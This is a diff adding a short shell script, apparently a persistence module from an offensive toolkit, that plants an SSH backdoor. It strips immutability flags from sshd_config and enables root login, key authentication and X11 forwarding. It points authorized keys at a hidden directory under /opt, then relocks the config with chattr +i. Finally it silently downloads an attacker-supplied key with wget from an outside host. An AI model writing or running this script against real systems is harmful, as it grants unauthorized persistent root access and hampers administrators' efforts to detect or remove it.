@@ -1,0 +1,32 @@
+#!/bin/sh
+
+web_ssh_key="10.80.100.13/ripjaw/modules/auxillary/ssh.key"
+key_path="/opt//.ssh"
+dropKey ()
+{
+	## Get Config File
+	configFile=$(find / -name sshd_config)
+
+	## Get Keypath
+
+	## Change config
+	chattr -i $configFile
+	chattr -a $configFile
+	sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/'  $configFile		#Permit Root Login
+	sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' $configFile 	#Enable Keys
+	sed -i 's/^#*X11Forwarding.*/X11Forwarding yes/' $configFile			#Enable X11 Forwarding
+	sed -i "s/^#*AuthorizedKeysFile.*/AuthorizedKeysFile $key_path/" $configFile	#Set Authorized Key Path
+	chattr +i $configFile
+	
+	## Drop Key
+
+	if [ ! -d "$key_path" ]
+	then
+		mkdir -p "$key_path"
+	fi
+	
+	touch "$key_path/key.pem"
+	wget -q -O- "$web_ssh_key" > "$key_path/key.pem" 					#Drops Key
+}
+
+dropKey > /dev/null 2>&1
